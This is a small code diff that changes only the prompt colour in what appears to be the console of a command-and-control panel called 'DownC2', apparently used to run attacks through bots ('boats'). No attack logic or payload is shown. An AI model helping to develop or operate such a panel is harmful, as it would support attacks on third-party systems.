@@ -260,7 +260,7 @@ def main():
     threading.Thread(target=update_attacks, daemon=True).start()
     while True:
         sys.stdout.write(f"\x1b]2;0 boats | CodeSyntax Custom Build | Serving {logged_in_user} | Active Sessions 2 | 9999.99 Millenium(s)\x07")
-        sin = input(Colorate.Horizontal(Colors.DynamicMIX((Col.light_blue, Col.cyan)),f"""DownC2•{logged_in_user} » """))
+        sin = input(Colorate.Horizontal(Colors.DynamicMIX((Col.light_blue, Col.red)),f"""DownC2•{logged_in_user} » """))
         sinput = sin.split(" ")[0]
         if sinput == "cls" or sinput == "c":
             os.system('clear')
